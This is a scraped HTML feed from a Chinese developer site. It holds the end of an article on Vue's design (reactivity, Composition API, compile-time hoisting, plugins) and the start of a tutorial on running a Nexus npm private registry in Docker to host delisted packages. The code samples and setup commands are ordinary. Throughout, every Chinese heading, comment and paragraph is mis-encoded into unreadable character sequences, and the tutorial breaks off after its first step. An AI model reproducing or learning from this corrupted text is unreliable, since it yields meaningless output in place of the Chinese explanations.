  <span class="hljs-attr">user</span>: { <span class="hljs-attr">name</span>: <span class="hljs-string">'Vue'</span> }
})

<span class="hljs-comment">// è‡ªåŠ¨è¿½è¸ªä¾èµ–ï¼Œé«˜æ•ˆæ›´æ–°</span>
<span class="hljs-title function_ invoke__">watchEffect</span>(() =&gt; {
  console.<span class="hljs-title function_ invoke__">log</span>(state.count) <span class="hljs-comment">// è‡ªåŠ¨è¿½è¸ª count</span>
})
</code></pre>
<h4 data-id="heading-4">3.Â <strong>è™šæ‹ŸDOMçš„ä¼˜åŒ–ç­–ç•¥</strong></h4>
<ul>
<li><strong>ç¼–è¯‘æ—¶ä¼˜åŒ–</strong>ï¼šæ¨¡æ¿ç¼–è¯‘æ—¶è¿›è¡Œé™æ€åˆ†æ</li>
<li><strong>Patch Flag</strong>ï¼šæ ‡è®°åŠ¨æ€èŠ‚ç‚¹ç±»å‹</li>
<li><strong>Tree Flattening</strong>ï¼šå‡å°‘åµŒå¥—èŠ‚ç‚¹éå†</li>
<li><strong>é™æ€æå‡</strong>ï¼šå¤ç”¨é™æ€èŠ‚ç‚¹</li>
</ul>
<h3 data-id="heading-5">ğŸ¯Â <strong>API è®¾è®¡å“²å­¦</strong></h3>
<h4 data-id="heading-6">4.Â <strong>é€‰é¡¹å¼API â†’ ç»„åˆå¼APIçš„æ¼”è¿›</strong></h4>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// é€‰é¡¹å¼APIï¼ˆæ˜“ä¸Šæ‰‹ï¼‰</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> { <span class="hljs-attr">count</span>: <span class="hljs-number">0</span> } },
  <span class="hljs-attr">methods</span>: { <span class="hljs-title function_">increment</span>(<span class="hljs-params"/>) { <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++ } }
}

<span class="hljs-comment">// ç»„åˆå¼APIï¼ˆæ›´å¥½çš„é€»è¾‘å¤ç”¨ï¼‰</span>
<span class="hljs-keyword">import</span> { ref, computed } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">setup</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)
    <span class="hljs-keyword">const</span> double = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> count.<span class="hljs-property">value</span> * <span class="hljs-number">2</span>)
    <span class="hljs-keyword">return</span> { count, double }
  }
}
</code></pre>
<h4 data-id="heading-7">5.Â <strong>å•æ–‡ä»¶ç»„ä»¶ï¼ˆSFCï¼‰è®¾è®¡</strong></h4>
<p>vue</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- Component.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- è§†å›¾æ¨¡æ¿ --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{{ message }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-comment">// ç»„ä»¶é€»è¾‘</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-title function_">data</span>(<span class="hljs-params"/>) { <span class="hljs-keyword">return</span> { <span class="hljs-attr">message</span>: <span class="hljs-string">'Hello'</span> } }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-comment">/* ä½œç”¨åŸŸæ ·å¼ */</span>
<span class="hljs-selector-tag">div</span> { <span class="hljs-attribute">color</span>: blue; }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h3 data-id="heading-8">âš¡Â <strong>æ€§èƒ½ä¼˜åŒ–è®¾è®¡</strong></h3>
<h4 data-id="heading-9">6.Â <strong>ç¼–è¯‘æ—¶ä¼˜åŒ–æŠ€æœ¯</strong></h4>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç¼–è¯‘å‰æ¨¡æ¿</span>
&lt;div&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>é™æ€å†…å®¹<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{{ dynamic }}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>
&lt;/div&gt;

<span class="hljs-comment">// ç¼–è¯‘åä¼˜åŒ–ä»£ç </span>
<span class="hljs-keyword">import</span> { createElementVNode <span class="hljs-keyword">as</span> _createElementVNode } <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span>
<span class="hljs-comment">// é™æ€èŠ‚ç‚¹è¢«æå‡</span>
<span class="hljs-keyword">const</span> _hoisted_1 = <span class="hljs-comment">/*#__PURE__*/</span><span class="hljs-title function_">_createElementVNode</span>(<span class="hljs-string">"span"</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">"é™æ€å†…å®¹"</span>)
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">_ctx</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">_createElementVNode</span>(<span class="hljs-string">"div"</span>, <span class="hljs-literal">null</span>, [
    _hoisted_1,  <span class="hljs-comment">// é™æ€èŠ‚ç‚¹å¤ç”¨</span>
    <span class="hljs-title function_">_createElementVNode</span>(<span class="hljs-string">"span"</span>, <span class="hljs-literal">null</span>, _ctx.<span class="hljs-property">dynamic</span>, <span class="hljs-number">1</span> <span class="hljs-comment">/* TEXT */</span>)
  ])
}
</code></pre>
<h4 data-id="heading-10">7.Â <strong>æ¸²æŸ“æœºåˆ¶ä¼˜åŒ–</strong></h4>
<ul>
<li><strong>å¼‚æ­¥æ›´æ–°é˜Ÿåˆ—</strong>ï¼šåˆå¹¶åŒä¸€äº‹ä»¶å¾ªç¯ä¸­çš„æ›´æ–°</li>
<li><strong>ç»„ä»¶çº§æ›´æ–°</strong>ï¼šç²¾ç¡®è¿½è¸ªç»„ä»¶ä¾èµ–</li>
<li><strong>æ‡’è§‚å¯Ÿ</strong>ï¼šå¤§æ•°æ®é‡æ—¶çš„æ€§èƒ½ä¼˜åŒ–</li>
</ul>
<h3 data-id="heading-11">ğŸ”§Â <strong>å¼€å‘ä½“éªŒè®¾è®¡</strong></h3>
<h4 data-id="heading-12">8.Â <strong>TypeScripté›†æˆè®¾è®¡</strong></h4>
<p>typescript</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// å®Œæ•´çš„TSç±»å‹æ”¯æŒ</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title">User</span> {
  id: number
  name: <span class="hljs-built_in">string</span>
}

<span class="hljs-keyword">const</span> user = <span class="hljs-keyword">ref</span>&lt;User&gt;({ id: <span class="hljs-number">1</span>, name: <span class="hljs-string">'Vue'</span> })
</code></pre>
<h4 data-id="heading-13">9.Â <strong>å·¥å…·é“¾ä¸€ä½“åŒ–è®¾è®¡</strong></h4>
<p>text</p>
<pre><code class="hljs language-objectivec" lang="objectivec">Vue <span class="hljs-built_in">CLI</span> / Vite é¡¹ç›®è„šæ‰‹æ¶
â”œâ”€â”€ å¼€å‘æœåŠ¡å™¨ï¼ˆçƒ­é‡è½½ï¼‰
â”œâ”€â”€ æ„å»ºä¼˜åŒ–ï¼ˆä»£ç åˆ†å‰²ã€Tree-shakingï¼‰
â”œâ”€â”€ TypeScript æ”¯æŒ
â”œâ”€â”€ å•å…ƒæµ‹è¯•é›†æˆ
â””â”€â”€ ç”Ÿäº§éƒ¨ç½²ä¼˜åŒ–
</code></pre>
<h4 data-id="heading-14">10.Â <strong>è‡ªå®šä¹‰æ¸²æŸ“å™¨è®¾è®¡</strong></h4>
<p>javascript</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// å¯ä»¥åˆ›å»ºè‡ªå®šä¹‰æ¸²æŸ“å™¨</span>
<span class="hljs-keyword">import</span> { createRenderer } from <span class="hljs-string">'@vue/runtime-core'</span>

<span class="hljs-type">const</span> { createApp } = <span class="hljs-built_in">createRenderer</span>({
  <span class="hljs-comment">// å®ç°å¹³å°ç‰¹å®šçš„API</span>
  createElement,
  insert,
  remove,
  patchProp
})

<span class="hljs-comment">// æ”¯æŒ WebGLã€Canvasã€Native ç­‰ä¸åŒå¹³å°</span>
</code></pre>
<h3 data-id="heading-15">ğŸ“¦Â <strong>ç”Ÿæ€ç³»ç»Ÿè®¾è®¡</strong></h3>
<h4 data-id="heading-16">11.Â <strong>æ’ä»¶ç³»ç»Ÿè®¾è®¡</strong></h4>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç»Ÿä¸€çš„æ’ä»¶æ¥å£</span>
<span class="hljs-keyword">const</span> myPlugin = {
  <span class="hljs-title function_">install</span>(<span class="hljs-params">app, options</span>) {
    <span class="hljs-comment">// å…¨å±€åŠŸèƒ½æ³¨å…¥</span>
    app.<span class="hljs-property">config</span>.<span class="hljs-property">globalProperties</span>.<span class="hljs-property">$myMethod</span> = <span class="hljs-function">() =&gt;</span> {}
    <span class="hljs-comment">// å…¨å±€ç»„ä»¶æ³¨å†Œ</span>
    app.<span class="hljs-title function_">component</span>(<span class="hljs-string">'MyComponent'</span>, <span class="hljs-title class_">MyComponent</span>)
    <span class="hljs-comment">// è‡ªå®šä¹‰æŒ‡ä»¤</span>
    app.<span class="hljs-title function_">directive</span>(<span class="hljs-string">'focus'</span>, { <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el</span>) { el.<span class="hljs-title function_">focus</span>() } })
  }
}
</code></pre>
<h4 data-id="heading-17">12.Â <strong>é€»è¾‘å¤ç”¨è®¾è®¡</strong></h4>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç»„åˆå¼å‡½æ•° - é€»è¾‘å¤ç”¨</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useMouse</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> x = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)
  <span class="hljs-keyword">const</span> y = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)
  
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">e</span>) {
    x.<span class="hljs-property">value</span> = e.<span class="hljs-property">pageX</span>
    y.<span class="hljs-property">value</span> = e.<span class="hljs-property">pageY</span>
  }
  
  <span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'mousemove'</span>, update))
  <span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'mousemove'</span>, update))
  
  <span class="hljs-keyword">return</span> { x, y }
}
</code></pre>
<h3 data-id="heading-18">ğŸ”„Â <strong>å‡çº§ä¸å…¼å®¹è®¾è®¡</strong></h3>
<h4 data-id="heading-19">13.Â <strong>æ¸è¿›å¼å‡çº§ç­–ç•¥</strong></h4>
<ul>
<li>Vue 2 â†’ Vue 3 çš„æ¸è¿›è¿ç§»</li>
<li>å…¼å®¹æ€§æ„å»ºç‰ˆæœ¬</li>
<li>Composition API ä¸ Options API å…±å­˜</li>
<li>è¿ç§»æ„å»ºå·¥å…·</li>
</ul>
<h3 data-id="heading-20">ğŸ“ŠÂ <strong>è®¾è®¡å“²å­¦æ€»ç»“</strong></h3>

































<table><thead><tr><th>è®¾è®¡åŸåˆ™</th><th>å…·ä½“ä½“ç°</th></tr></thead><tbody><tr><td><strong>æ¸è¿›å¢å¼º</strong></td><td>å¯é€æ­¥é‡‡ç”¨æ¡†æ¶åŠŸèƒ½</td></tr><tr><td><strong>å…³æ³¨ç‚¹åˆ†ç¦»</strong></td><td>å•æ–‡ä»¶ç»„ä»¶ä¸­çš„template/script/style</td></tr><tr><td><strong>å£°æ˜å¼ç¼–ç¨‹</strong></td><td>æ¨¡æ¿è¯­æ³•æè¿°UIçŠ¶æ€</td></tr><tr><td><strong>å“åº”å¼é©±åŠ¨</strong></td><td>æ•°æ®å˜åŒ–è‡ªåŠ¨æ›´æ–°è§†å›¾</td></tr><tr><td><strong>ç»„åˆä¼˜äºç»§æ‰¿</strong></td><td>ç»„åˆå¼APIçš„é€»è¾‘å¤ç”¨</td></tr><tr><td><strong>å¼€å‘ä½“éªŒä¼˜å…ˆ</strong></td><td>å®Œå–„çš„å·¥å…·é“¾å’ŒDevTools</td></tr></tbody></table>
<p>Vueçš„è®¾è®¡<strong>åœ¨çµæ´»æ€§ã€æ€§èƒ½ã€å¼€å‘ä½“éªŒä¹‹é—´å–å¾—äº†æä½³çš„å¹³è¡¡</strong>ï¼Œæ—¢ä¿è¯äº†æ˜“ç”¨æ€§ï¼Œåˆä¸å¤±æ‰©å±•æ€§å’Œæ€§èƒ½è¡¨ç°ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Nexus respository æ­å»ºå‰ç«¯ npm ç§æœ]]></title>    <link>https://juejin.cn/post/7592559120118349870</link>    <guid>https://juejin.cn/post/7592559120118349870</guid>    <pubDate>2026-01-08T03:20:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592559120118349870" data-draft-id="7592424951659986970" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Nexus respository æ­å»ºå‰ç«¯ npm ç§æœ"/> <meta itemprop="keywords" content="Docker,å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T03:20:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Carry345"/> <meta itemprop="url" content="https://juejin.cn/user/831674360017678"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Nexus respository æ­å»ºå‰ç«¯ npm ç§æœ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/831674360017678/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Carry345
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:20:48.000Z" title="Thu Jan 08 2026 03:20:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ‰äº›è€é¡¹ç›®,å·²ç»åœ¨ç”Ÿäº§ç¯å¢ƒç¨³å®šè¿è¡Œå¤šæ—¶,ä½†æ˜¯ä»–çš„ä¸ªåˆ«ä¾èµ–åœ¨npmä¸‹æ¶äº†,åäººæ— æ³•æ­£å¸¸ä¸‹è½½ä¾èµ–æ€ä¹ˆåŠå‘¢?</p>
<ul>
<li>å¯¹äºæ¯”è¾ƒç†Ÿæ‚‰,æˆ–è€…å¯ä»¥è½»æ¾æ‰¾åˆ°æ›¿æ¢ç‰ˆæœ¬çš„,å»ºè®®ç›´æ¥å‡çº§æˆ–æ›¿æ¢</li>
<li>å‡çº§æˆ–æ›¿æ¢é£é™©è¾ƒé«˜,é‚£ä¹ˆç»§ç»­ä½¿ç”¨åŸä¾èµ–</li>
</ul>
<p>è¿™é‡Œæˆ‘å±äºç¬¬äºŒç§æƒ…å†µ,æ‰€ä»¥æ­å»ºäº† Nexus respository oss æ¥å®ç°ç¼ºå¤±ä¾èµ–çš„ä¸‹è½½.</p>
<p>ç¯å¢ƒ:</p>
<ul>
<li>docker 29.1.3</li>
<li>node v22.16.0</li>
</ul>
<h3 data-id="heading-0">1. å‡†å¤‡ç›®å½•(æ•°æ®æŒä¹…åŒ–)</h3>
<p>éšæ„è‡ªå®šä¹‰,æˆ‘è¿™é‡Œåˆ›å»ºäº†:</p>
<pre><code class="hljs language-bash" lang="bash">/Users/carry/disk/docker-volume
</code></pre>
<h3 data-id="heading-1">2. å¯åŠ¨ Nexus å®¹å™¨</h3>
<p>æ³¨æ„å°†<code>/Users/carry/disk/docker-volume</code>æ›¿æ¢ä¸ºè‡ªå·±çš„ç›®å½•</p>
<pre><code class="hljs language-bash" lang="bash">docker run -d \
--name nexus \
-p 8081:8081 \
-v /Users/carry/disk/docker-volume:/nexus-data \
sonatype/nexus3
</code></pre>
<h3 data-id="heading-2">3. è·å–åˆå§‹ç®¡ç†å‘˜å¯†ç </h3>
<p>æ³¨æ„å°†<code>/Users/carry/disk/docker-volume</code>æ›¿æ¢ä¸ºè‡ªå·±çš„ç›®å½•</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> /Users/carry/disk/docker-volume/nexus/admin.password
</code></pre>
<h3 data-id="heading-3">4. è®¿é—® GUI</h3>
<p>GUI è·¯å¾„: <a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A8081" target="_blank" title="http://localhost:8081" ref="nofollow noopener noreferrer">http://localhost:8081</a></p>
<p>è´¦å·å¯†ç :<code>admin</code>/<code>åˆšåˆšè·å–çš„å¯†ç </code></p>
<h5 data-id="heading-4">4.1.1. åˆ›å»º npm ä»“åº“ç»“æ„</h5>
<h6 data-id="heading-5">1ï¸âƒ£ åˆ›å»º npm-hosted (ç§æœ‰)</h6>
<p>ç”¨äºæ‰‹åŠ¨ä¿å­˜å·²ç»ä¸‹æ¶çš„åŒ…</p>
<pre><code class="hljs language-scss" lang="scss">Settings â†’ Repositories â†’ Create repository â†’ npm (hosted)
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/42f7eacf96b543cab62fd5d3ba1ae349~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2FycnkzNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447247&amp;x-signature=6yaHAizZQvcwm2v21Of9StBvWOw%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dbe9ae0deb49443eade7bc0d84867e95~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2FycnkzNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447247&amp;x-signature=yqjBHsT9ON76RrwVm87D8NA9V30%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8630cc93ed5a445a8137ddaff4e0b954~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2FycnkzNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447247&amp;x-signature=g8Qzjt4cI5WvGY747exFKihFC1U%3D" alt="" loading="lazy"/></p>
<p>ğŸŒ¸ è®°å¾—ç‚¹å‡»åº•éƒ¨çš„ <code>Create repository</code></p>
<h6 data-id="heading-6">2ï¸âƒ£ åˆ›å»º npm-proxy (å…¬å…± npm ä»£ç†)</h6>
<p>ç”¨äºå…œåº•</p>
<pre><code class="hljs language-scss" lang="scss">Create repository â†’ npm (proxy)
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23ea8e12a021431eb29151a67ac81918~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2FycnkzNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447247&amp;x-signature=Qwk9QbYBGoGAjLmUk5%2FdfMLjwMQ%3D" alt="" loading="lazy"/></p>
<h6 data-id="heading-7">3ï¸âƒ£ åˆ›å»º npm-group (å¯¹å¤–ç»Ÿä¸€å…¥å£)</h6>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">Create</span> repository â†’ npm (<span class="hljs-keyword">group</span>)
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3e4d0eb50f64366864d3ff965d5b7c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2FycnkzNDU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447247&amp;x-signature=U05898dhv9rgr8xHQDAkjH861k0%3D" alt="" loading="lazy"/></p>
<p>åˆ°è¿™é‡Œæ¡†æ¶æ­å»ºå®Œæˆ,ç°åœ¨å¯ä»¥åœ¨ <code>Browse</code>èœå•ä¸‹çœ‹è§<code>npm-hosted</code>ã€<code>npm-proxy</code>ã€<code>npm-group</code>,éƒ½æ˜¯ç©ºçš„.</p>
<h3 data-id="heading-8">5. ä¿å­˜å·²ä¸‹æ¶åŒ…</h3>
<h4 data-id="heading-9">5.1. ä» node_modules åå‘è¿˜åŸ npm åŒ…</h4>
<p>ä»¥ <code>chokidar-next@4.0.14</code>ä¸ºä¾‹,å¯ä»¥é€šè¿‡ä¸€ä¸‹å‘½ä»¤éªŒè¯å…¬å…±åŒ…ä¸­ä¸å­˜åœ¨æ­¤åŒ…</p>
<pre><code class="hljs language-perl" lang="perl">npm view chokidar-<span class="hljs-keyword">next</span>@4.<span class="hljs-number">0</span>.<span class="hljs-number">14</span>
</code></pre>
